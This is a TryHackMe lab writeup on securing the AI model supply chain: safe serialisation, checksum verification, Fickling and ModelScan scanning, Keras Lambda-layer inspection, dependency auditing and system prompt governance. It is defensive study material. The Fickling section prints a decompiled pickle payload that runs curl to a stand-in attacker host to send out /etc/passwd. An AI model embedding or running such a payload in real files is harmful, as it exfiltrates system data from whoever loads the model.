# 🛡️ TryHackMe: Securing the AI Supply Chain Writeup

**Platform:** TryHackMe  
**Difficulty:** Intermediate  
**Tools Used:** pickletools, Fickling, ModelScan, h5py, pip-audit, Syft, inspect_h5_model.py  
**OWASP LLM Reference:** LLM03:2025 — Supply Chain Vulnerabilities  
**MITRE ATLAS:** AML.T0010 — ML Supply Chain Compromise  
**NIST AI RMF:** Govern 1.2 · Measure 2.2 · Manage 2.1

---

## Overview

Defensive counterpart to the Supply Chain Attack Vectors room — building SupplySecLab to close every gap exposed in the TryTrainMe breach. Applied layered mitigations across six attack surfaces: safe serialisation formats, SHA-256 integrity verification, static scanning with Fickling and ModelScan, Keras architecture inspection, dependency auditing with pip-audit and Syft SBOM generation, and API provider assessment including system prompt governance. Demonstrated that no single control is sufficient — effective supply chain security requires verification at every layer.

---

## Skills Demonstrated

- Implementing SafeTensors and `weights_only=True` to eliminate pickle-based code execution
- Applying the five-step Model Acquisition Framework (quarantine → verify → scan → inspect → approve)
- SHA-256 checksum verification to detect tampered model files
- Static scanning with Fickling (pickle decompilation) and ModelScan (multi-format, severity-rated)
- Architecture inspection of Keras `.h5` models using h5py and ModelScan's Lambda detection
- Dependency auditing with pip-audit and SBOM generation with Syft (CycloneDX format)
- API provider due diligence checklist and behavioural baseline establishment
- System prompt governance as a supply chain control

---

## Part 1: Safe Serialisation Formats

The TryTrainMe breach began with a malicious pickle file. The first-line defence: eliminate pickle-based code execution entirely.

### Defence 1 — SafeTensors

SafeTensors (by Hugging Face) provides a strict guarantee: **no code execution is possible during loading**.

| Feature | Pickle | SafeTensors |
|---------|--------|-------------|
| Structure | Arbitrary Python bytecode | JSON header + raw binary tensor data |
| Code execution | Yes — via `__reduce__` and other opcodes | No — format cannot encode executable instructions |
| Content | Any Python object | Only tensor data (weights, biases) |
| Validation | None — loads and executes blindly | Header parsed and validated before data is read |

**Migration workflow:**
```python
import torch
from safetensors.torch import save_file, load_file

# Load existing pickle model safely first
model_weights = torch.load("model.pkl", weights_only=True)

# Save as SafeTensors
save_file(model_weights, "model.safetensors")

# Load SafeTensors (always safe)
safe_weights = load_file("model.safetensors")
```

> ⚠️ **The conversion itself requires loading the original pickle.** Verify the pickle is safe before converting — Tasks 4/5 tools apply here.

### Defence 2 — `weights_only=True`

When `torch.load()` runs, it uses pickle internally. Setting `weights_only=True` restricts the unpickler to tensor reconstruction only — any pickle instructions trying to import `os` or call `system()` are blocked and raise an error instead of executing.

```python
# UNSAFE: pickle can execute any embedded code
model = torch.load("model.pt")

# SAFE: pickle restricted to tensor reconstruction only
model = torch.load("model.pt", weights_only=True)
```

**Note:** From PyTorch 2.6 onward, `weights_only=True` is the default. Earlier versions must set it explicitly.

### Limitations of Safe Serialisation

Safe serialisation is necessary but not sufficient:

1. **Extension spoofing:** Files with `.safetensors` extension can contain pickle bytecode (CVE-2023-6730). Never trust file extensions alone.
2. **Architecture-level attacks survive:** A Keras Lambda layer executes at inference time, not load time. SafeTensors conversion leaves it untouched.
3. **Weights-level backdoors:** Manipulated learned values that misbehave on trigger inputs — no format change removes these.

---

## Part 2: Model Verification and Provenance

### SHA-256 Integrity Verification

A checksum computed from a file's contents changes completely if a single byte changes. If the author publishes SHA-256 hashes, comparing them before use detects tampering in transit.

```bash
sha256sum /opt/supply-chain/models/product_recommender.safetensors \
          /opt/supply-chain/models/model_review_v2.pkl \
          /opt/supply-chain/models/product_recommender.pkl
```

**Lab finding:** `model_review_v2.pkl` did not match its expected hash — tampered since checksum was published.

### Model Card Review Checklist

| Section | What to Check | Red Flag |
|---------|--------------|---------|
| Model details | Author, organisation, version, licence | No author or missing licence |
| Intended use | Specific task description | Vague or overly broad claims |
| Training data | Dataset name, size, source | No training data description |
| Performance | Metrics on standard benchmarks | No metrics, or unrealistically high claims |
| Limitations | Known failure modes and biases | No limitations listed |

> A missing or sparse model card is one of the strongest warning signs of a suspicious model.

### Extended Supply Chain Artefacts

**LoRA Adapters:** Small fine-tuning files that modify base model behavior. A clean base model + malicious adapter = compromised model. Apply the same intake process to adapters.

**Model Merging/Conversion Services:** Researchers have demonstrated that third-party conversion services can inject malicious code during processing. Treat any model that passed through an unverified pipeline as a new artefact requiring fresh verification.

### The Five-Step Model Acquisition Framework

| Step | Action | Purpose |
|------|--------|---------|
| 1. **Quarantine** | Download into isolated staging — never directly to production | Prevent untested artefacts reaching live systems |
| 2. **Source verification** | Verify author, organisation, verification badges, publication history | Establish provenance and credibility |
| 3. **Integrity check** | Compute SHA-256 and compare against published values | Confirm file has not been tampered with in transit |
| 4. **Security scan** | Run Fickling, ModelScan, dependency audit; inspect model card | Detect malicious content and known vulnerabilities |
| 5. **Approve or reject** | Promote to production or quarantine permanently | Enforce a gate between untested and trusted artefacts |

> Technical scanning tools cannot catch everything. A model can pass all scans but still contain a subtle data poisoning backdoor. The framework's value is in requiring multiple independent checks before trust is granted.

---

## Part 3: Behavioural Analysis

A malicious model load generates telemetry that diverges from a clean baseline.

**Clean load (baseline):**
```
SESSION START — model_load
MODEL LOAD BEGIN — /models/sentiment_model.pkl (pickle)
FILE ACCESS — /models/sentiment_model.pkl (rb) [normal]
MODEL LOAD COMPLETE — object_type: SentimentModel
SESSION STOP — model_load
```

**Malicious load (compromised model):**
Three anomalous events appear:
- `IMPORT` flagged `[DANGEROUS]` — `os` module imported
- `SYSTEM CALL` flagged `[CRITICAL]` — shell command executed
- `object_type: int` returned instead of a model object

**Lab finding:** The compromised model returned `int` instead of a model, attempted to exfiltrate `/etc/passwd` via curl — all at `pickle.load()` time, before any inference ran. The model still responded normally to queries. **The telemetry was the only signal.**

> Without instrumented loading, this attack is completely invisible. This is what scanning prevents.

---

## Part 4: Scanning Models Before Use

### Fickling (Trail of Bits) — Static Pickle Analysis

Fickling decompiles pickle bytecode to readable Python **without executing the file**.

```bash
# Decompile malicious model
fickling /opt/supply-chain/models/model_review_v2.pkl
```
```python
from os import system
_var0 = system('curl http://attacker.com/exfil -d @/etc/passwd')
result0 = _var0
```

Immediately reveals the attack: `os.system` executing a curl exfiltration command.

```bash
# Automated safety check
fickling --check-safety -p /opt/supply-chain/models/model_review_v2.pkl
# Flags: OVERTLY MALICIOUS — os.system call

fickling --check-safety -p /opt/supply-chain/models/product_recommender.pkl
# Silence = no issues detected
```

### ModelScan (Protect AI) — Multi-Format Scanning

ModelScan extends beyond pickle to scan PyTorch, TensorFlow, and Keras formats with severity ratings.

```bash
modelscan -p /opt/supply-chain/models/model_review_v2.pkl
```
```
--- Summary ---
Total Issues: 1
CRITICAL: 1

--- CRITICAL ---
Unsafe operator found:
  - Severity: CRITICAL
  - Description: Use of unsafe operator 'system' from module 'os'
```

```bash
modelscan -p /opt/supply-chain/models/product_recommender.safetensors
```
```
--- Summary ---
No issues found! 🎉
```

### Severity Reference

| Severity | Meaning | Action |
|----------|---------|--------|
| CRITICAL | Confirmed dangerous operation (`os.system`, `subprocess`) | Do not use — quarantine immediately |
| HIGH | Likely dangerous (`eval`, network calls) | Do not use without thorough review |
| MEDIUM | Suspicious but potentially legitimate (custom unpickler, Lambda layer) | Review carefully before use |
| LOW | Informational (non-standard opcodes) | Note and monitor |

> **No scanning tool catches everything.** Sophisticated attackers may use obfuscation. Scanning is one defence layer, not a guarantee.

---

## Part 5: Architecture-Level Threat Detection

Fickling and ModelScan catch serialisation-level attacks. Keras Lambda layers hide malicious logic in the **model's architecture** — executing at inference time, not load time.

**Why Lambda layer attacks are especially dangerous:**
- Fire at prediction time, not when the model loads
- Survive SafeTensors conversion — the logic is in the architecture, not the serialisation
- Model loads cleanly and passes checksum verification
- Only activates during live inference

### ModelScan H5 Architecture Scanning

```bash
modelscan -p /opt/supply-chain/models/image_classifier_v2.h5
```
```
--- Summary ---
MEDIUM: 1

--- MEDIUM ---
Unsafe operator found:
  - Severity: MEDIUM
  - Description: Use of unsafe operator 'Lambda' from module 'Keras'
```

Lambda layers are MEDIUM (not CRITICAL) because legitimate uses exist in normal development. The scanner flags for review, not automatic quarantine.

### h5py Architecture Inspection

```bash
python3 /opt/supply-chain/tools/inspect_h5_model.py /opt/supply-chain/models/image_classifier.h5
# Result: 4 layers, all [OK]

python3 /opt/supply-chain/tools/inspect_h5_model.py /opt/supply-chain/models/image_classifier_v2.h5
# Result: 5 layers — extra Lambda layer marked [WARNING]
```

**Lab finding:** Suspicious Lambda layer name: `manipulate_output`

**Clean model:** 4 layers — `input_layer`, `flatten`, `dense`, `dense_1`  
**Compromised model:** 5 layers — same 4 plus `manipulate_output` [WARNING]

> Attackers may disguise Lambda layers with benign names like `normalize_output` or `apply_scaling`. Any Lambda or custom layer in a model you did not build yourself warrants investigation.

---

## Part 6: Dependency Auditing and SBOMs

### Version Pinning Strategy

```
# BAD: allows any version — attacker's malicious update installs automatically
numpy

# BETTER: pins major.minor, allows patches
numpy>=1.24,<1.25

# BEST: pins exact version — attacker must match precisely
numpy==1.24.3
```

### Lockfiles

Go beyond version pinning by recording cryptographic hashes of every installed package. Even if an attacker replaces a package on PyPI with the same version number, the hash mismatch blocks installation.

| Tool | Lockfile | Command |
|------|---------|---------|
| pip-compile (pip-tools) | requirements.txt with hashes | `pip-compile --generate-hashes` |
| Poetry | poetry.lock | `poetry lock` |

### pip-audit — Vulnerability Scanning

```bash
pip-audit -r /opt/supply-chain/project/requirements.txt
```

Checks every dependency against known CVE databases. Output shows package name, installed version, advisory ID, and the version that fixes it. Upgrading to the fixed versions eliminates known risks.

### Private Package Index (Strongest Dependency Confusion Defence)

```ini
# ~/.pip/pip.conf
[global]
index-url = https://your-private-pypi.company.com/simple/
extra-index-url = https://pypi.org/simple/
```

`index-url` = primary source (pip checks first). `extra-index-url` = fallback. Internal packages always resolve privately — dependency confusion attack surface eliminated.

### SBOM Generation with Syft

A Software Bill of Materials lists every component in your project — packages, libraries, frameworks, versions. Enables instant impact assessment when new vulnerabilities are disclosed.

```bash
# Generate CycloneDX SBOM (security-focused, OWASP format)
syft /opt/supply-chain/project/ --exclude './venv/**' -o cyclonedx-json > /tmp/sbom.json

# Human-readable table view
syft /opt/supply-chain/project/ --exclude './venv/**' -o table
```

| SBOM Format | Maintained By | Primary Strength |
|-------------|--------------|-----------------|
| SPDX | Linux Foundation | Licence compliance, ISO standard (ISO/IEC 5962:2021) |
| CycloneDX | OWASP | Security-focused, includes vulnerability data |

> Licensing is itself a supply chain risk — copyleft dependencies can force open-sourcing of the entire project. SBOMs make this manageable by mapping every component to its licence terms.

---

## Part 7: API Provider Assessment

When consuming AI via API, there is no file to scan. Supply chain risks take a different form — the same mindset applies through different controls.

### Defence 1 — Provider Due Diligence

| Factor | What to Verify | Red Flag |
|--------|---------------|---------|
| Data handling | Privacy policy, data retention, training opt-out | "We may use your data to improve models" with no opt-out |
| Model versioning | Versioned endpoints, deprecation notices, changelogs | Model changes without notification |
| Security certifications | SOC 2, ISO 27001, pen testing | No published security documentation |
| Incident response | Disclosed vulnerabilities, response timeline | No security contact or disclosure policy |
| Transparency | Model cards, training data documentation | Undocumented model behaviour changes |

### Defence 2 — Behavioural Baseline

Since you cannot inspect API model weights, monitor outputs instead. Run a fixed set of test prompts periodically and flag significant response changes. This is the **API equivalent of checksum verification**.

Track: factual accuracy, response format, refusal rates, latency, error rates.

### Defence 3 — System Prompt Governance

System prompt templates sourced from external repositories are supply chain artefacts. A compromised template changes application behaviour without any model change, file change, or version bump.

**Lab demonstration (Config A vs Config B):**

| Query | Config A (Internal) | Config B (Community Template) |
|-------|---------------------|-------------------------------|
| Return policy | 30-day window, replacement, support@trytrainme.com | **Wrong timeframe, wrong company name ("TryTrainML")** |
| Who has admin access? | Refuses — redirects to privacy policy | **Attempts to answer** — confidentiality guardrail absent |

Same model. Same endpoint. Only the system prompt source differed. Config B's template was sourced from a public repository without review — wrong policy, wrong company name, and no security guardrails.

**Governance requirements:** Version-control system prompts in your own repository. Review changes through your standard process. Test prompt changes against the behavioural baseline before deployment.

### Defence 4 — Sandboxed Evaluation Phase

Before integrating any third-party LLM into production:

| Phase | Activity | Pass Condition |
|-------|---------|---------------|
| 1 | Load in isolated sandbox | Model loads without errors in air-gapped environment |
| 2 | Fixed prompt battery | Answers match known-correct responses |
| 3 | Adversarial probes | Safety boundaries hold under adversarial input |
| 4 | Baseline comparison | Output distribution matches existing model |
| Result | Promote or reject | All phases pass → Production; any fail → Reject |

> Do not rely solely on published benchmarks. A model can be fine-tuned to perform well on safety evaluations while containing targeted backdoors that activate only on specific inputs.

---

## Layered Defence Summary

| Gap from TryTrainMe Breach | SupplySecLab Defence | Tools |
|---------------------------|---------------------|-------|
| No policy on model formats | SafeTensors + `weights_only=True` | torch, safetensors |
| Model integrity never verified | SHA-256 checksums + model card review | sha256sum |
| Model never scanned | Static scanning before deployment | Fickling, ModelScan |
| Hidden architecture logic undetected | Architecture inspection of Keras layers | ModelScan H5LambdaDetectScan, inspect_h5_model.py |
| Malicious package slipped through | Version pinning + pip-audit + SBOM | pip-audit, Syft |
| External prompt never reviewed | System prompt governance + behavioural baseline | Version control, monitoring |

---

## Key Takeaways

- **No single control is sufficient** — a file that passes its checksum can carry a payload; a file that passes Fickling and ModelScan can carry a Lambda layer; SafeTensors eliminates serialisation attacks but not architecture attacks
- **The five-step acquisition framework is the gate** — quarantine → verify → scan → inspect → approve before any model reaches production
- **Architecture-level attacks are the hardest to detect** — Lambda layers survive SafeTensors conversion, fire at inference time (not load time), and are invisible without explicit architecture inspection
- **Telemetry is the only signal for runtime attacks** — instrumented loading with Python audit hooks (`sys.addaudithook()`) or an overridden `find_class()` surfaces malicious behavior before it reaches a trusted registry
- **System prompts are supply chain artefacts** — a single text string sourced from an unreviewed community template can silently remove security policies, serve wrong company information, and disable confidentiality guardrails
- **API providers hide the supply chain, not eliminate it** — behavioural baseline monitoring replaces checksum verification; provider due diligence replaces source verification; the governance instinct is identical

---

*Part of an ongoing TryHackMe SOC Analyst learning path | Tools: Fickling, ModelScan, pip-audit, Syft, h5py | Frameworks: OWASP LLM Top 10 (LLM03:2025), MITRE ATLAS AML.T0010, NIST AI RMF*
